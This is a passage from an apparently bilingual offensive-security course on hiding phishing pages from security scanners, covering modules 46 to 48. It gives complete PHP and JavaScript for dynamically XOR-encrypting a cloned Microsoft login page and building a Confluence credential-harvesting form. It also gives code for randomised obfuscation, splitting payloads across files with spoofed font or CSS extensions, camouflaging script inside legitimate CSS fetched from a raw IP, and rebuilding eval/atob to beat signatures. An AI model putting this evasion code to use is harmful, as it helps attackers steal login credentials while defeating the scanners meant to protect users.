    var aesCbc = new aesjs.ModeOfOperation.cbc(keyBytes, ivBytes);
    var decryptedBytes = aesCbc.decrypt(encryptedBytes);

    // Remove padding & convert back to bytes
    var unpaddedDecryptedBytes = aesjs.padding.pkcs7.strip(decryptedBytes);
    var decryptedText = aesjs.utils.utf8.fromBytes(unpaddedDecryptedBytes);

    // Write decrypted content to the document
    document.write(decryptedText);
}

aesJsDecrypt(key, iv, enc);

</script>
</html>

```

### AES-JS - Results

- When we load the page, it loads normally as expected. Using Dev Tools we can see that `document.write` ran successfully since it overwritten all the previous content.

- Viewing the page source reveals that the content is encrypted.

## Objetivos
Use the Web Crypto API to encrypt a phishing page

Use the AES-JS library to encrypt a phishing page

Compare the difference of using the Web Crypto API versus the AES-JS library


---

# Módulo 46 — Anti-Análise Via Criptografia Dinâmica

Módulo 46 — Anti-Analysis Via Dynamic Encryption

- # Módulo 46 — Anti-Análise Via Criptografia Dinâmica

# Disclaimer

## Introdução
So far in this course, we've discussed several frontend obfuscation techniques like Base64, XOR, and AES encryption. An issue that's common to all the methods we've explored so far is that the obfuscated content is static. This means that the same content is displayed everytime the website is accessed, unless we explicitly re-generate the content with a new key and update our phishing page. However, this can become tedious and due to modern security solutions being rapid in creating signatures, we must ensure our content is dynamically being updated to render their signatures useless.In this module, we will implement dynamic encryption which modifies the encrypted content every time the page is refreshed.
## Estratégia de Implementação
The implementation for dynamic encryption requires the usage of backend scripts. Specifically, we will use a PHP script to perform the following actions:
The contents of the original unobfuscated phishing page is read and stored in a variable.

- A key is dynamically created instead of being hard coded.

- The phishing page's contents are encrypted on the server side via the dynamically created key.

- The encrypted phishing contents and the key are passed to the client side.

- A JavaScript function performs decryption using the provided key.

- When the page is refreshed or a new user accesses the website, restart the process from step 1.

This module will continue with the utilization of PHP, however, the same process can be performed using any other server-side programming language.

## Dynamic Encryption (1)
Start by uploading the original phishing page to the web server and place it outside the document root to ensure it isn't accessible to the internet. The web server must have read access to the file, which can be achieved by changing its ownership using `sudo chown www-data:www-data [filename]`.

We will read the contents of the original phishing page using `file_get_contents`.

```
// REQUIRED: sudo chown www-data:www-data /var/www/ms-login.html

// File placed outside of our document root /var/www/html
$htmlContent = file_get_contents('/var/www/ms-login.html');

```

### Encrypting The Phishing Page
Next, we will need to generate a random key rather than hard-code a value. We'll use the `random_bytes` function to generate random bytes and then use `bin2hex` to convert them to hexadecimal characters.

```
$key = bin2hex(random_bytes(16));

```
We also need to define the encryption function, which in this module will be the `xorEncryptDecrypt` function from the Anti-Analysis - XOR Obfuscation module. The `xorEncryptDecrypt` function will however have a minor change where instead of using URL encoding and decoding, we switch to Base64 encoding. This change is necessary because PHP's encoding and decoding behavior differs from JavaScript, which can lead to inconsistencies in how encrypted data is processed. By using Base64 encoding, we ensure compatibility across both languages. Finally, call the `xorEncryptDecrypt` function providing the `htmlContent` and `key` and set the boolean value to `true` for Base64 encoding.

```
<?php
// Generate key
$key = bin2hex(random_bytes(16));

// Read phishing file
// File placed outside of our document root /var/www/html
$htmlContent = file_get_contents('/var/www/ms-login.html');

// xorEncryptDecrypt - PHP version
function xorEncryptDecrypt($input, $key, $encode = true) {
    $output = '';
    $keyIndex = 0;
    $keyLength = strlen($key);

    if (!$encode) {
        $input = base64_decode($input);
    }

    for ($i = 0; $i < strlen($input); $i++) {
        $charCode = ord($input[$i]);
        $keyCharCode = ord($key[$keyIndex]);
        $xorCharCode = $charCode ^ $keyCharCode;
        $output .= chr($xorCharCode);
        $keyIndex = ($keyIndex + 1) % $keyLength;
    }

    if ($encode) {
        $output = base64_encode($output);
    }

    return $output;
}

$encryptedContent = xorEncryptDecrypt($htmlContent, $key, true);
?>

```

### Passing Contents To Client-Side
The encryption key and the encrypted content must be sent to the client side for decryption using the `xorEncryptDecrypt` JavaScript function. To facilitate this, we'll create two `<div>` elements with the IDs `encrypted` and `key`, which will store the encrypted content and the key, respectively. In addition, we'll include a `<script>` element to reference the `decrypt.js` file, which will handle the decryption process.

```
echo "<html><body>";
echo "<div id='encrypted' style='display:none;'>$encryptedContent</div>";
echo "<div id='key' style='display:none;'>$key</div>"; 
echo "<script src='decrypt.js'></script>";
echo "</body></html>";

```

### Decrypting Phishing Page
In this step, we create the `decrypt.js` file which contains the `xorEncryptDecrypt` JavaScript function. This file will fetch the encrypted contents and key from their respective `<div>`, pass them to the `xorEncryptDecrypt` function, and then use `document.write` to output the decrypted content.

```
function xorEncryptDecrypt(input, key, encode) {
    let output = '';
    let keyIndex = 0;

    if (!encode) {
        input = atob(input);
    }

    for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i);
        let keyCharCode = key.charCodeAt(keyIndex);
        let xorCharCode = charCode ^ keyCharCode;
        output += String.fromCharCode(xorCharCode);
        keyIndex = (keyIndex + 1) % key.length;
    }

    if (encode) {
        output = btoa(output);
    }

    return output;
}

// Extract the encrypted data and key from the DOM
const encryptedContent = document.getElementById('encrypted').textContent;
const key = document.getElementById('key').textContent;

// Decrypt & write content
const decryptedHtml = xorEncryptDecrypt(encryptedContent, key, false);
document.write(decryptedHtml);

```

### Complete Code
The complete code that will be used for our demo is shown below, starting with the PHP script, `index.php`, then `decrypt.js`.

```
<?php
// index.php

$key = bin2hex(random_bytes(16)); // Generate a random 16-byte key
$htmlContent = file_get_contents('/var/www/ms-login.html'); // Read phishing page's contents

// XOR function
function xorEncryptDecrypt($input, $key, $encode = true) {
    $output = '';
    $keyIndex = 0;
    $keyLength = strlen($key);

    if (!$encode) {
        $input = base64_decode($input);
    }

    for ($i = 0; $i < strlen($input); $i++) {
        $charCode = ord($input[$i]);
        $keyCharCode = ord($key[$keyIndex]);
        $xorCharCode = $charCode ^ $keyCharCode;
        $output .= chr($xorCharCode);
        $keyIndex = ($keyIndex + 1) % $keyLength;
    }

    if ($encode) {
        $output = base64_encode($output);
    }

    return $output;
}

// Encrypt content
$encryptedContent = xorEncryptDecrypt($htmlContent, $key, true);

// Pass the encrypted content & key to the front
// And include our JS file, decrypt.js
echo "<html><body>";
echo "<div id='encrypted' style='display:none;'>$encryptedContent</div>";
echo "<div id='key' style='display:none;'>$key</div>"; 
echo "<script src='decrypt.js'></script>";
echo "</body></html>";
?>

```

```
// decrypt.js

// Fetch the encrypted content and key from the divs
const encryptedContent = document.getElementById('encrypted').textContent;
const key = document.getElementById('key').textContent;

// XOR function
function xorEncryptDecrypt(input, key, encode) {
    let output = '';
    let keyIndex = 0;

    if (!encode) {
        input = atob(input);
    }

    for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i);
        let keyCharCode = key.charCodeAt(keyIndex);
        let xorCharCode = charCode ^ keyCharCode;
        output += String.fromCharCode(xorCharCode);
        keyIndex = (keyIndex + 1) % key.length;
    }

    if (encode) {
        output = btoa(output);
    }

    return output;
}

// Decrypt the content
const decryptedHtml = xorEncryptDecrypt(encryptedContent, key, false);

// Log to console (debugging)
console.log(decryptedHtml);

// Print to document
document.write(decryptedHtml);

```

## Demo
The video can be found in folder: `./videos/dynamic-encryption-demo.mov`

## Dynamic Encryption (2)
Our previous implementation placed the decryption function inside `decrypt.js` rather than embedding it directly in the frontend. An alternate implementation is to directly embed the `xorEncryptDecrypt` function and its invocation within our PHP script, removing the need for `decrypt.js`.

```
<?php
$key = bin2hex(random_bytes(16)); // Generate a random 16-byte key
$htmlContent = file_get_contents('/var/www/ms-login.html'); // Read phishing page's contents

// XOR function
function xorEncryptDecrypt($input, $key, $encode = true) {
    $output = '';
    $keyIndex = 0;
    $keyLength = strlen($key);

    if (!$encode) {
        $input = base64_decode($input);
    }

    for ($i = 0; $i < strlen($input); $i++) {
        $charCode = ord($input[$i]);
        $keyCharCode = ord($key[$keyIndex]);
        $xorCharCode = $charCode ^ $keyCharCode;
        $output .= chr($xorCharCode);
        $keyIndex = ($keyIndex + 1) % $keyLength;
    }

    if ($encode) {
        $output = base64_encode($output);
    }

    return $output;
}

// Encrypt content
$encryptedContent = xorEncryptDecrypt($htmlContent, $key, true);

echo "<html>
<div id='encrypted' style='display:none;'>$encryptedContent</div>
<div id='key' style='display:none;'>$key</div>
<script>
function xorEncryptDecrypt(input, key, encode) {
    let output = '';
    let keyIndex = 0;

    if (!encode) {
        input = atob(input);
    }

    for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i);
        let keyCharCode = key.charCodeAt(keyIndex);
        let xorCharCode = charCode ^ keyCharCode;
        output += String.fromCharCode(xorCharCode);
        keyIndex = (keyIndex + 1) % key.length;
    }

    if (encode) {
        output = btoa(output);
    }
    return output;
}

var encryptedContent = document.getElementById('encrypted').textContent;
var key = document.getElementById('key').textContent;
var decryptedHtml = xorEncryptDecrypt(encryptedContent, key, false);
document.write(decryptedHtml);
</script></html>";
?>

```

## Objetivos
Perform dynamic encryption using a different encryption algorithm

Hide the decryption key in the encrypted blob


---

# Module 47 - Anti-Analysis Dynamic Obfuscation via Obfuscator.io

Módulo 47 — Anti-Analysis Dynamic Obfuscation via Obfuscator.io

# Disclaimer

# Módulo 47 — Anti-Análise: Ofuscação Dinâmica via Obfuscator.io

## Introdução
This module will demonstrate a relatively simple yet effective method to dynamically obfuscate JavaScript in our phishing page. This technique utilizes the javascript-obfuscator library, which is the same library used in Obfuscator.io.

The `javascript-obfuscator` will be invoked from the backend instead of including the `.js` file directly in the website. This approach is more stealthy, as having the obfuscator `.js` file included in the frontend can, in itself, signal that obfuscation is being used on the site.

## Instalando Javascript-Obfuscator
The first step is to install the `javascript-obfuscator` on the server that hosts the phishing content. The installation process will require the installation of `npm` if it isn't already installed.

```
# Install npm first
sudo apt install npm

# Install javascript-obfuscator globally
npm install -g javascript-obfuscator

```

## Preparando Conteúdo JavaScript Phishing
Since the library is meant for obfuscating JavaScript, we need to ensure that our phishing content is loaded dynamically via JavaScript. This module will re-use the dynamic Confluence phishing page, shown below, from the Anti-Analysis: Dynamic Code Generation module. Save the JavaScript shown below to the path `/var/www/login.js`.

```
      function run(){
        var container = document.createElement("div");
        container.className = "login-container";

        var heading = document.createElement("h1");
        heading.textContent = "Log in to Confluence";
        container.appendChild(heading);

        var elem = document.createElement("form");
        elem.action = "submit.php";
        elem.method = "POST";

        var usernameDiv = document.createElement("div");
        var usernameLabel = document.createElement("label");
        usernameLabel.htmlFor = "username";
        usernameLabel.textContent = "Username or email";
        var usernameInput = document.createElement("input");
        usernameInput.type = "text";
        usernameInput.id = "username";
        usernameInput.name = "username";
        usernameInput.required = true;
        usernameDiv.appendChild(usernameLabel);
        usernameDiv.appendChild(usernameInput);
        elem.appendChild(usernameDiv);

        var passwordDiv = document.createElement("div");
        var passwordLabel = document.createElement("label");
        passwordLabel.htmlFor = "password";
        passwordLabel.textContent = "Password";
        var passwordInput = document.createElement("input");
        passwordInput.type = "password";
        passwordInput.id = "password";
        passwordInput.name = "password";
        passwordInput.required = true;
        passwordDiv.appendChild(passwordLabel);
        passwordDiv.appendChild(passwordInput);
        elem.appendChild(passwordDiv);

        var buttonDiv = document.createElement("div");
        var submitButton = document.createElement("button");
        submitButton.type = "submit";
        submitButton.textContent = "Log In";
        buttonDiv.appendChild(submitButton);
        elem.appendChild(buttonDiv);

        container.appendChild(elem);

        var forgotPasswordDiv = document.createElement("div");
        forgotPasswordDiv.className = "forgot-password";
        var forgotPasswordLink = document.createElement("a");
        forgotPasswordLink.href = "#";
        forgotPasswordLink.textContent = "Can't log in?";
        forgotPasswordDiv.appendChild(forgotPasswordLink);
        container.appendChild(forgotPasswordDiv);

        document.body.appendChild(container);

        var style = document.createElement("style");
        style.textContent = `
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f5f7;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-container {
                background-color: #ffffff;
                border: 1px solid #dfe1e6;
                border-radius: 5px;
                padding: 30px;
                width: 300px;
                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
                text-align: center;
            }
            .login-container h1 {
                font-size: 24px;
                margin-bottom: 20px;
                color: #0052cc;
            }
            .login-container label {
                display: block;
                margin-bottom: 5px;
                text-align: left;
            }
            .login-container input[type="text"],
            .login-container input[type="password"],
            .login-container button {
                width: 100%;
                max-width: 300px;
                padding: 10px;
                margin-bottom: 10px;
                border: 1px solid #dfe1e6;
                border-radius: 3px;
                box-sizing: border-box;
            }
            .login-container button {
                background-color: #0052cc;
                color: #ffffff;
                border: none;
                cursor: pointer;
                font-size: 16px;
            }
            .login-container button:hover {
                background-color: #0747a6;
            }
            .login-container .forgot-password {
                margin-top: 10px;
                font-size: 14px;
            }
            .login-container .forgot-password a {
                color: #0052cc;
                text-decoration: none;
            }
            .login-container .forgot-password a:hover {
                text-decoration: underline;
            }
        `;
        document.head.appendChild(style);
    }

    run();

```

## Building A Dynamic Obfuscator Script
With both the JavaScript file and the obfuscation library available, the library can be utilized within a PHP backend script to obfuscate the JavaScript content. This process generates an obfuscated JavaScript file, which is then read and returned to the frontend. The `javascript-obfuscator` library provides a variety of CLI options for different methods of obfuscation. Since some options are incompatible with each other, it is essential to carefully review the documentation and include compatible flags.

The helper function shown below, `getRandomObfuscatorOptions`, will generate a random set of CLI options for the obfuscation process, selecting and shuffling options to create a unique combination each time it's called, and then return them as a single string. This process ensures that each invocation provides a different mix of obfuscator options, making the obfuscation process more dynamic and less predictable.

```
function getRandomObfuscatorOptions() {
    $options = [
        '--compact ' . (rand(0, 1) ? 'true' : 'false'),
        '--control-flow-flattening ' . (rand(0, 1) ? 'true' : 'false'),
        '--self-defending ' . (rand(0, 1) ? 'true' : 'false'),
    ];

    shuffle($options);
    return implode(' ', $options);
}

```
After that, `shell_exec` will be used to execute the `javascript-obfuscator` command with the selected options, obfuscating the original JavaScript file and outputting the results to a temporary file located at `/var/www/temp_login.js`.

```
$originalJsPath = '/var/www/login.js';
$tempJsPath = '/var/www/temp_login.js'; // Path for the temporary file where the obfuscated content will be placed

// Execute javascript-obfuscator
$obfuscationOptions = getRandomObfuscatorOptions();
$cmd = "javascript-obfuscator {$originalJsPath} --output {$tempJsPath} {$obfuscationOptions}";
$output = shell_exec($cmd);

```
Finally, the obfuscated content is read and displayed to the user. The complete code is shown below.

```
<?php
function getRandomObfuscatorOptions() {
    $options = [
         '--compact ' . (rand(0, 1) ? 'true' : 'false'),
         '--control-flow-flattening ' . (rand(0, 1) ? 'true' : 'false'),
         '--self-defending ' . (rand(0, 1) ? 'true' : 'false'),
    ];

    shuffle($options);
    return implode(' ', $options);
}

$originalJsPath = '/var/www/login.js';
$tempJsPath = '/var/www/temp_login.js';

$obfuscationOptions = getRandomObfuscatorOptions();
$cmd = "javascript-obfuscator {$originalJsPath} --output {$tempJsPath} {$obfuscationOptions}";
$output = shell_exec($cmd);

$obfuscatedJs = file_get_contents($tempJsPath);

// Add the JS to an HTML template
$htmlTemplate = <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confluence Login</title>
</head>
<body>
    <script>
    $obfuscatedJs
    </script>
</body>
</html>
HTML;

echo $htmlTemplate;
?>

```
The video can be found in folder: `./videos/obfuscator-demo.mov`

## Conclusão
Obfuscation libraries come with both advantages and disadvantages. One advantage is the reduced complexity and ease of use. As demonstrated, minimal code is needed to generate highly randomized output that can evade static signature detection. However, a significant disadvantage is that being a public library, anyone with sufficient time and expertise can potentially reverse-engineer the code, identify signatures, or even deobfuscate it. This is the case with Obfuscator.io, as someone has created an Obfuscator.io Deobfuscator.

## Objetivos
Use different obfuscator CLI options than the ones shown in the module

Find a different JavaScript obfuscation library to use for dynamic obfuscation

Find an HTML obfuscation library and use it to dynamically obfuscate an HTML phishing page


---

# Módulo 48 — Anti-Análise Via Busca de Conteúdo Remoto

Módulo 48 — Anti-Analysis Via Fetching Remote Content

- # Módulo 48 — Anti-Análise Via Busca de Conteúdo Remoto

# Disclaimer

## Introdução
The obfuscation modules allowed us to evade static signature detection by encoding or encrypting the content and obfuscating it. While it works against the static detection engine, this method unintentionally adds an indicator of maliciousness to our website. This module will demonstrate various ways of obfuscating our fetching of external resources to make it more challenging for scanners and defenders that are analyzing our website.
## Detecting Base64-Encoded Websites
Recall when we utilized `eval` and `atob` to Base64-encode content in the Anti-Analysis: Base64 Obfuscation module. A defender or scanner that are analyzing our static contents of the website would see the following:
```
<html><script>
eval(atob('R1ZtR1p6b21ERUdjSVFZQSA9ICdfJTE4JTIxJTdEcTZoZHMl...'));
</script></html>

```
The content above is highly unusual for a typical website, and it is still possible to create a static rule to detect it. The Python script below retrieves the contents of a specified URL and analyzes them for specific indicators. It checks for the presence of the strings `"eval"` and `"atob"`, as well as Base64-encoded content that is at least 50 characters long.
```
import requests
import re
import argparse

def detection_rule_1(url):
    try:
         # Set user-agent
         # Good habit to always set a user agent
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'}
        
        # Fetch URL's static content
        response = requests.get(url, headers=headers, timeout=5)  # Added headers parameter here
        content = response.text

        # If eval and atob are in the website's fetched content
        if 'eval' in content and 'atob' in content:
            
            base64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}' # Regex to find Base64 encoded blocks of 50+ chars
            if re.search(base64_pattern, content):
                return True
        return False
    except requests.RequestException as e:
        print(f"Error fetching URL {url}: {e}")
        return False

def process_url_list(filepath):
    with open(filepath, 'r') as file:
        for line in file:
            url = line.strip()
            if not (url.startswith('https://') or url.startswith('http://')):
                url = 'https://' + url
            if detection_rule_1(url):
                print(f"{url}: Obfuscated website.")
            else:
                print(f"{url}: Normal website.")

def main():
    parser = argparse.ArgumentParser(description="Check if URLs contain obfuscated content")
    parser.add_argument('-u', '--url', help="URL to check")
    parser.add_argument('-l', '--list', help="File containing list of URLs to check, one per line")
    args = parser.parse_args()

    if args.url:
        if detection_rule_1(args.url):
            print(f"{args.url}: Obfuscated website.")
        else:
            print(f"{args.url}: Normal website.")
    elif args.list:
        process_url_list(args.list)
    else:
        print("No URL or list of URLs provided.")

if __name__ == "__main__":
    main()

```
A list of websites that include our obfuscated website will be provided to the Python script. The image shows that our simple scanner is successful in detecting our obfuscated website using the simple detection rule.
```
python3 simple-scanner.py -l websites-list.txt

```

## Vinculando Arquivo JavaScript Externo
One of the easiest methods to avoid embedding JavaScript code directly into our page is to link to an external JavaScript file, as we've done several times throughout the course.
```
<!-- Fetching decrypt.js -->
<script src="decrypt.js"></script>

```
While we're not directly adding the obfuscated content to our web page, most advanced scanners will not only crawl the main page but will also follow and analyze the content of linked files and external resources. The Python script below will fetch the embedded `<script>` tag and scan the link in the `src` attribute.
```
import requests
import re
from urllib.parse import urljoin
import argparse
from bs4 import BeautifulSoup

def detection_rule_1(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'}
        response = requests.get(url, headers=headers, timeout=5)
        content = response.text

        if 'eval' in content and 'atob' in content:
            base64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
            if re.search(base64_pattern, content):
                return True

        return scan_scripts(url, content)

    except requests.RequestException as e:
        print(f"Error fetching URL {url}: {e}")
        return False

def scan_scripts(base_url, html_content):
    try:
        soup = BeautifulSoup(html_content, 'html.parser')
        scripts = soup.find_all('script', src=True)
        for script in scripts:
            script_url = urljoin(base_url, script['src'])  # Resolves relative URLs
            if detection_rule_1(script_url):  # Recursively check each script
                return True
        return False
    except Exception as e:
        print(f"Error scanning scripts in {base_url}: {e}")
        return False

def process_url_list(filepath):
    with open(filepath, 'r') as file:
        for line in file:
            url = line.strip()
            if not (url.startswith('https://') or url.startswith('http://')):
                url = 'https://' + url
            if detection_rule_1(url):
                print(f"{url}: Obfuscated website.")
            else:
                print(f"{url}: Normal website.")

def main():
    parser = argparse.ArgumentParser(description="Check if URLs contain obfuscated content")
    parser.add_argument('-u', '--url', help="URL to check")
    parser.add_argument('-l', '--list', help="File containing list of URLs to check, one per line")
    args = parser.parse_args()

    if args.url:
        if detection_rule_1(args.url):
            print(f"{args.url}: Obfuscated website.")
        else:
            print(f"{args.url}: Normal website.")
    elif args.list:
        process_url_list(args.list)
    else:
        print("No URL or list of URLs provided.")

if __name__ == "__main__":
    main()

```

```
python3 simple-scanner-and-crawler.py -u https://example.com

```

### Dynamic Script Construction And Linking
Rather than directly inserting the file name into the `<script>` tag, we can dynamically generate and append it using JavaScript. The snippet below breaks the string `"decrypt.js"` across several variables, concatenates them, dynamically generates a new `<script>` element, and sets its `src` attribute to the concatenated string (i.e. `"decrypt.js"`). This technique may make it more difficult for some basic scanners to detect the script inclusion, as they rely on static pattern matching.
```
var a = 'dec';
var b = 'rypt';
var c = '.js';
var obfuscatedSrc = a + b + c;
var script = document.createElement('script');
script.src = obfuscatedSrc;
document.documentElement.appendChild(script);

```

## Fetch API
We can also fetch the contents of our JavaScript file using the Fetch API. The Fetch API is a modern and flexible way to make network requests, allowing us to retrieve and process resources asynchronously.The code below makes a request to fetch `decrypt.js` and then writes its contents to the page using `document.write`.
```
fetch('https://example.com/fetch/decrypt.js')
  .then(response => response.text())
  .then(html => {
    document.write(html);
  });

```
Our static source code is shown below followed by an image from the Developer Tools showing our request fetching the contents.Keep in mind that the URL can also be dynamically constructed as we've demonstrated earlier to add further obfuscation.
```
var s1 = 'ht';
var s2 = 'tps';
var s3 = '://';
var d1 = 'exa';
var d2 = 'mple';
var d3 = '.com/';
var p1 = 'fet';
var p2 = 'ch/';
var f1 = 'de';
var f2 = 'crypt';
var e1 = '.j';
var e2 = 's';

var dynamicURL = s1 + s2 + s3 + d1 + d2 + d3 + p1 + p2 + f1 + f2 + e1 + e2;

fetch(dynamicURL)
  .then(response => response.text())
  .then(jsCode => {
    document.write(jsCode);
  });

```

### Recursively Fetching Scripts
Previously, we were fetching `decrypt.js` which contained the entirety of our encrypted phishing content. To further obfuscate our intentions, we can perform a recursive fetching strategy across multiple files. Initially, our fetch operation retrieves `dec1.js`, which in turn fetches `dec2.js`, and so forth, continuing through to `dec5.js` where our encrypted content is finally loaded.While these fetch operations remain visible in the "Network" tab of the Developer Tools, this method introduces benign code and additional complexity. This complexity can obscure the true functionality of each file, making it more challenging to understand the intention of these files.The JavaScript within these files will be identical to the previous script that uses the fetch API; the only change will be in the filename, which will be modified to `dec1.js`, `dec2.js`, and so on.
### Splitting Content
One disadvantage of recursive fetching is the fact that the encrypted phishing content remains in a single file. Following the fetches will reveal the file with the entirety of the phishing content. Therefore, a better approach may be to split the content into mulitple files, fetch the files' content and reassemble them.Splitting a file can be performed using the Linux `split` command. The `-n` flag specifies the number of files to split, in this example, we split the file into 10 different files, `dec0.js` to `dec9.js`.
```
split -n 10 -d -a 1 phishing.js dec --additional-suffix=.js

```
We will also update the script on our home page to fetch the contents of the 10 newly created files, concatenate them, and finally use `document.write` to execute the script.
```
<html>
<script>
var splitContent = [];

function fetchAndConcat(index = 0) {
    // If were on the 10th file, concatenate the content and write it to the document
    if (index === 10) {
        document.write(splitContent.join(''));
        return;
    }

    // Defining script name to be fetched (dec0.js, dec1.js, dec2.js etc.)
    var scriptUrl = 'dec' + index + '.js';

    // Fetching the contents and adding them to the array
    fetch(scriptUrl)
        .then(response => response.text())
        .then(scriptContent => {
            splitContent[index] = scriptContent;
            fetchAndConcat(index + 1); // Recursively call the function to fetch the next file
        })
        .catch(error => console.error('Failed to load script:', error));
}

// Invoke function
fetchAndConcat();

</script>
</html>

```
Notice in the demo below how the files fetched contain a part of the overall file and the increased delay in the page loading.The video can be found in folder: `./videos/split-and-fetch.mov`
### File Extension Spoofing
A potentially useful point to keep in mind is that `<script>` tags and the Fetch API do necessitate that the JavaScript files have the `.js` extension. Therefore, we can set the file extension to a benign one such as `.woff` or `.css` to make it appear benign to someone analyzing our website. Modify the `split` command to generate 10 files with a `.woff` extension.
```
split -n 10 -d -a 1 phishing.js dec --additional-suffix=.woff

```

### Content Camouflage
Although file extension spoofing may make the analysis process more tedious, downloading and inspecting the file clearly indicates it isn't a font file.To make our content not stand out as much, we'll disguise our malicious content by inserting legitimate content at the beginning of the file that matches the expected file type. For example, if our phishing content is in a file with a `.css` extension, we'll start with valid CSS styling and then add our JavaScript code at the end. In our example CSS file below, the file begins with typical CSS content, followed by a delimiter `|`, and then the JavaScript code enclosed in `<script>` tags. The delimiter `|` helps us identify and extract the JavaScript code from the rest of the file.
```
/* Legitimate CSS */
body{background-color:#f0f0f0;font-family:Arial,sans-serif;color:#333;margin:0;padding:0;line-height:1.6}header{background:linear-gradient(45deg,#3f87a6,#ebf8e1);padding:20px;text-align:center;border-bottom:5px solid #333}header h1{font-size:2.5em;text-transform:uppercase;letter-spacing:2px;color:#fff;text-shadow:2px 2px #000}nav{background-color:#333;overflow:hidden}nav ul{list-style-type:none;margin:0;padding:0}nav ul li{float:left}nav ul li a{display:block;color:#fff;text-align:center;padding:14px 16px;text-decoration:none;

... /* More CSS */

... /* More CSS */

... /* More CSS */

/* JavaScript content, starting with our delimeter "|" */
|<script>eval(atob('bWpQdmdHd1JUUEtib3pQZCA9ICclMDQlNDB2eCU3QjUlM0ElNjAlN0MlMTMlMEMlMTAlNUMlMEQlMENrJTBGJTVFVSUxMVVBUFpTQkUlMDQlMTElMEMlMTdnbCUyNyUxRiUwRiUxQV9pJTBDUUclMDklMDglMEZrJTBFJTAzJTVDV0klNUIlM0VBJTEzJTEyJTEyJTBDUiUwOCUxMyUxMSU1Q1YlMDVDJTVEQSU1RCUxMyUwRlElNDAlMTFEJTA3JTVEJTAwQSUxMiUwRSUxMV8lMTNRJTEzX1NLJTEyJTA4JTVESlUlNUNEJTA2ayUxMiUxNyUxOEFfVFBFRCUwNyU1RCUwMEElMTIlMEUlMTFWJTBBJTVCJTE1ViU0MCUxMCUwRSUwQSUwNSUwQ0clMTVRVCUwMEFEJTA1QyUwNV9WRyUwMSUxNkUlMDRKJTE1JTExJTBEZCUwMEYlMEMlNDAlMTIlNURWJTE2JTE0JTE2VCUwOUFIJTAwJTVDJTE3SyUxNSUxQSU1QyU1QyUwRUYlMDlQJTEzVSUwOCU1RCUxRSU1QyUwMFIlMTUlMDklMTIlMDAlMDBGJTE5JTVFJTEzJTBCJTBFJTE3JTEyQlZWXzNCUEUlMDUlMDdIQSUxNEFwJTVDXyUwRSU1RCUwNCU0MCUwRSUxRFRfJTE3JTVCJTBEJTFBVlElMTclMEMlM0QlMThBQyUxMCUwNVclMEQlMTIlM</script>

```
Fetching our CSS file and extracting the JavaScript will be done using the following script:
```
fetch('http://155.138.226.61/fetch/clean.css')
  .then(response => response.text())
  .then(html => {
    var extractedContent = html.substring(html.indexOf('|') + 1); // Extract everything after the delimeter "|"
    document.write(extractedContent);
  });

```
Inspecting the fetched files using Developer Tools only shows our CSS file, `clean.css`, which at first glance appears to be a benign CSS file.Only upon further inspecting the CSS file can we see that the file contains the phishing content.
### Dynamically Assembling Eval & Atob
We can improve the previous technique by breaking the suspicious functions `eval` and `atob` and dynamically reassembling them.
```
<!-- Before -->
<!-- Static string detection would catch 'eval' and 'atob' -->
<script>eval(atob(...));</script>

```

```
<!-- After -->
<!--'eval' and 'atob' are dynamically assembled -->
<script>var x='eva',y='l',z='ato',w='b',f=window[x+y],g=window[z+w];f(g('...'));</script>

```
The updated CSS file will be as shown below:
```
/* Legitimate CSS */
body{background-color:#f0f0f0;font-family:Arial,sans-serif;color:#333;margin:0;padding:0;line-height:1.6}header{background:linear-gradient(45deg,#3f87a6,#ebf8e1);padding:20px;text-align:center;border-bottom:5px solid #333}header h1{font-size:2.5em;text-transform:uppercase;letter-spacing:2px;color:#fff;text-shadow:2px 2px #000}nav{background-color:#333;overflow:hidden}nav ul{list-style-type:none;margin:0;padding:0}nav ul li{float:left}nav ul li a{display:block;color:#fff;text-align:center;padding:14px 16px;text-decoration:none;

... /* More CSS */

... /* More CSS */

... /* More CSS */

/* JavaScript content, starting with our delimeter "|" */
|<script>var x='eva',y='l',z='ato',w='b',f=window[x+y],g=window[z+w];f(g('bWpQdmdHd1JUUEtib3pQZCA9ICclMDQlNDB2eCU3QjUlM0ElNjAlN0MlMTMlMEMlMTAlNUMlMEQlMENrJTBGJTVFVSUxMVVBUFpTQkUlMDQlMTElMEMlMTdnbCUyNyUxRiUwRiUxQV9pJTBDUUclMDklMDglMEZrJTBFJTAzJTVDV0klNUIlM0VBJTEzJTEyJTEyJTBDUiUwOCUxMyUxMSU1Q1YlMDVDJTVEQSU1RCUxMyUwRlElNDAlMTFEJTA3JTVEJTAwQSUxMiUwRSUxMV8lMTNRJTEzX1NLJTEyJTA4JTVESlUlNUNEJTA2ayUxMiUxNyUxOEFfVFBFRCUwNyU1RCUwMEElMTIlMEUlMTFWJTBBJTVCJTE1ViU0MCUxMCUwRSUwQSUwNSUwQ0clMTVRVCUwMEFEJTA1QyUwNV9WRyUwMSUxNkUlMDRKJTE1JTExJTBEZCUwMEYlMEMlNDAlMTIlNURWJTE2JTE0JTE2VCUwOUFIJTAwJTVDJTE3SyUxNSUxQSU1QyU1QyUwRUYlMDlQJTEzVSUwOCU1RCUxRSU1QyUwMFIlMTUlMDklMTIlMDAlMDBGJTE5JTVFJTEzJTBCJTBFJTE3JTEyQlZWXzNCUEUlMDUlMDdIQSUxNEFwJTVDXyUwRSU1RCUwNCU0MCUwRSUxRFRfJTE3JTVCJTBEJTFBVlElMTclMEMlM0QlMThBQyUxMCUwNVclMEQlMTIlM</script>

```

## Modifying Popular JavaScript Libraries
